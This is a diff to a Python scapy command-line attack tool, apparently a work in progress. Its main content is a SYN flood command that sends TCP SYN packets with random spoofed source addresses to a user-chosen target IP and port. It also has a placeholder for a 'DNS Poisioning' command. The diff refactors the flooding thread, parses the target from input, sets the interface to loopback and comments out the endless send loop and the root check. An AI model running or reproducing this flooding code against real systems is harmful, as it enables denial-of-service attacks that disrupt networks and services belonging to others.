@@ -5,27 +5,25 @@ import string, sys
 from scapy.all import *
 
 
-#logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+#targetip = ""
+#port =""
 
-if os.geteuid() != 0:
-    sys.exit("[!] Please run as root")
-    
-total = 0
-conf.iface='en1';#network card XD
-
-
+'''TODO : cant get ip address. follow example 
+'''
 class sendSYN(threading.Thread):
-        global target, port
-        def __init__(self):
+        def __init__(self, targetip, port):
                 threading.Thread.__init__(self)
+		self.targetip = targetip
+		self.port = port
+	
         def run(self):
                 i = IP()
                 i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
-                i.dst = target
+                i.dst = self.targetip
 
                 t = TCP()
                 t.sport = random.randint(1,65535)
-                t.dport = port
+                t.dport = self.port
                 t.flags = 'S'
 
                 send(i/t, verbose=0)
@@ -53,7 +51,7 @@ class CLI(cmd.Cmd):
     def do_dns(self, arg):
 	"""DNS Poisioning."""	
     
-    def do_syn(self, target, port ):
+    def do_syn(self, arg):
 	"""syn [target ip] [port]
     #########################################
     # 
@@ -65,10 +63,33 @@ class CLI(cmd.Cmd):
 
 	   SYN flood: https://github.com/arthurnn/SynFlood  
 	    """
-	print "Flooding %s:%i with SYN packets." % (target, port)
-        
-	while 1:
-	    sendSYN().start()
+	if not(arg):
+	    print "No ip entered"
+    
+	else:
+
+	    print "\n",arg,"\n"
+    
+	    targetlist = arg.split(" ")
+    
+	    print targetlist
+
+	    targetip = targetlist[0]	
+	    print targetip
+
+	    port = int(targetlist[1])	
+	    print port
+	
+	    print "Flooding %s:%i with SYN packets." % (targetlist[0], port)
+	
+	    total = 0
+	    conf.iface='lo';#network card XD
+
+ 
+#	    while 1:
+
+	    syner = sendSYN(targetip, port)
+	    syner.start()
 	    total += 1
 	    sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
 	
@@ -87,10 +108,19 @@ class CLI(cmd.Cmd):
     # shortcuts
     do_q = do_quit
 
-#
-# try it out
-cli = CLI()
-cli.cmdloop()
+if __name__ == '__main__':
+
+    #logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+    #if os.geteuid() != 0:
+    #    sys.exit("[!] Please run as root")
+    
+    total = 0
+    conf.iface='lo';#network card XD
+    cli = CLI()
+    cli.cmdloop()
+
+
 '''if os.geteuid() != 0:
     sys.exit("[!] Please run as root")
     
